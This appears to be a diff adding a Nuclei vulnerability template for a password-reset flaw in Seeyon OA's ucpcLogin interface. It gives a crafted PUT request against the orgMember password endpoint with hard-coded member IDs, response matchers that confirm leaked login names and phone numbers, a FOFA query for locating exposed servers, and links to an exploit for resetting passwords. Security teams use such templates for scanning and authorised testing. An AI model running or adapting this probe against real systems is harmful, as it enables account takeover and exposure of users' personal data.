@@ -1,0 +1,39 @@
+id: seeyon-ucpcLogin-resetpass
+info:
+  name: 致远 OA ucpcLogin - 密码重置
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA-ucpcLogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md#%E8%87%B4%E8%BF%9Coa-ucpclogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="致远互联-OA"
+    tips: to use exp reset pass https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E8%87%B4%E8%BF%9C-oa-ucpcLogin-passwd-reset.yaml
+  tags: seeyon,resetpass,oa
+
+http:
+  - raw:
+      - |
+        PUT /seeyon/rest/orgMember/{{prepareid}}/password/share.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+    
+    payloads:
+      prepareid:
+        - '-7273032013234748168'
+        - '-4401606663639775639L'
+        - '5725175934914479521L'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "loginName","telNumber")'
+        condition: and
+
+# get vuln then to reset password : https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA-ucpcLogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md#%E8%87%B4%E8%BF%9Coa-ucpclogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E
